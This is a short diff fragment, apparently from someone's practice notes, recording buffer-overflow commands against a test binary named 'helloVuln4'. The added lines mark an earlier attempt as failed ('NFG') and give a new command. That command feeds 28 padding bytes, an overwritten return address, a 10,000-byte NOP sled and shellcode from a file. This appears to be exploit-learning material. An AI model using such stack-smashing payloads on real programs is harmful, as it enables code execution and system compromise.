@@ -27,3 +27,7 @@ drwxrwxr-x 8 cicorias cicorias  4096 Feb 21 14:16 ..
 
 
 ./helloVuln4 $(perl -e 'print "A"x28 . "\xd1\xdf\xff\xff"')
+
+NFG
+./helloVuln4 $(perl -e 'print "A"x28 . "\xd1\xdf\xff\xff" . "\x90"x10000')$(cat shell.bin)
+
